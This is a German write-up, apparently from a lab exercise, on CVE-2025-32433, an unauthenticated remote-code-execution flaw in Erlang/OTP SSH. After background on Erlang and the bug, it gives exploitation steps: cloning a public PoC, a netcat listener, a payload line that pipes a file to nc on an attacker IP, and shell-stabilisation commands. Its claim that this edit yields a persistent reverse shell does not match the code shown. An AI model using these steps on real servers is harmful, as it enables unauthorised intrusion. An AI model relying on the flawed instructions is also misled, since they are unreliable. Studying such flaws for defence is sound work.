# Was ist Erlang etc.
Erlang und sein begleitendes Framework, die Open Telecom Platform (OTP), bilden ein leistungsfähiges Ökosystem für den Aufbau verteilter fehlertoleranter Systeme. Erlang ist eine Programmiersprache zum Aufbau skalierbarer Echtzeitsysteme, die eine hohe Verfügbarkeit erfordern. Ursprünglich wurde Erlang von Ericsson für Telekommunikationssysteme entwickelt, hat sich jedoch im Laufe der Jahre zu einer Lösung für verschiedene Herausforderungen im Bereich der verteilten Datenverarbeitung entwickelt.

Erlang wird nicht nur von zahlreichen Unternehmen für die Produktentwicklung eingesetzt, sondern auch von vielen Universitäten für die Forschung und sogar für die Lehre. Sie können mehr über Erlang auf der offiziellen Seite erfahren.
OTP ist eine Sammlung von Middleware, Bibliotheken und Tools, die in Erlang geschrieben wurden. Obwohl das T in OTP für Telecom steht, hat sich OTP zu einem Allzweck-Framework für die Entwicklung verteilter Anwendungen entwickelt. Im Allgemeinen verwenden Projekte, die Erlang einsetzen, Erlang zusammen mit seinen Bibliotheken, d. h. Erlang/OTP.


Das Erlang/OTP SSH ist eine Implementierung des SSH-Protokolls als Teil des Erlang OTP. Es ermöglicht sicheren Shell-Zugang und sichere Dateiübertragungen in Erlang-basierten Systemen. Kürzlich wurde mit CVE-2025-32433 eine kritische Sicherheitslücke in der Erlang/OTP SSH-Implementierung bekannt, die eine nicht authentifizierte Remotecodeausführung (RCE) ermöglicht. Diese Schwachstelle wurde von Forschern der Ruhr-Universität Bochum entdeckt und mit einem CVSS-Score von 10,0 als kritisch eingestuft.

# Technischer Hintergrund
Diese Schwachstelle ist auf die Implementierung des SSH-Protokolls durch Erlang/OTP zurückzuführen, insbesondere auf die Behandlung der Nachrichten des Verbindungsprotokolls während der Pre-Authentifizierungsphase. Nach diesem technischen Überblick sind SSH-Nachrichtennummern von 80 und höher für die Post-Authentifizierung reserviert. Wenn also der SSH-Client eine SSH-Nachricht mit solchen Nummern sendet, bevor die Authentifizierung abgeschlossen ist, sollte der SSH-Server die Verbindung unterbrechen. Die mit der Schwachstelle betroffenen Server setzen dies nicht durch, so dass die Angreifer viel Spielraum haben, um ihre Nachrichten zu gestalten und schließlich Unautorisierte Code Ausführung zu erreichen.

Ein Proof of Concept (PoC) Exploit-Code wurde von Matthew Keeley geschrieben und kann hier gefunden werden. Der Exploit funktioniert in vier Stufen; die Payload wird in der vierten Stufe gesendet, die den Code des Angreifers ausführt, bevor die Authentifizierung durchgeführt wird.
https://github.com/platsecurity/CVE-2025-32433

# Exploitation

Herunterladen des Exploits: 
```
git clone https://github.com/ProDefense/CVE-2025-32433
```
Dann muss der Exploit noch angepasst werden mit Ziel IP und Ziel Port (in dem Beispiel hier 22 sonst aber der Port auf dem SSH liegt)

Nun muss man noch einen Netcat listener aufsetzen wie gewohnt mit 

```
nc -lvnp 4444
```

Wenn man jetzt den Exploit laufen lässt bekommt man den Output "pwned" in der Netcat shell allerdings schließt sich die Rev Shell instant wieder.

Wenn man jetzt das ganze so umbauen will das man nicht nur kurz eine Revshell mit output bekommt sondern längerfristig eine Shell hat ändert man in Zeile 108 den Code: 

```
command = 'file:write_file("/lab.txt", <<"pwned">>).'
```

Zu dem Code 

```
command='os:cmd("cat /lab.txt | nc 10.10.199.230 4444").'
```
(Natürlich mit eigener IP und in NC Spezifizierten port)

Und Tadaaa da ist die Rev shell. Nun diese noch stabilisieren und Schon erledigt. 

### Stabilisieren der shell 

In deiner Shell (sobald du Zugriff hast), führe aus:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Dann:

`CTRL+Z   # in dein Terminal stty raw -echo; fg`

Dann nochmal:

`reset export TERM=xterm`

→ Jetzt kannst du z. B. `sudo`, `nano`, `ssh` usw. verwenden wie in einer echten Shell.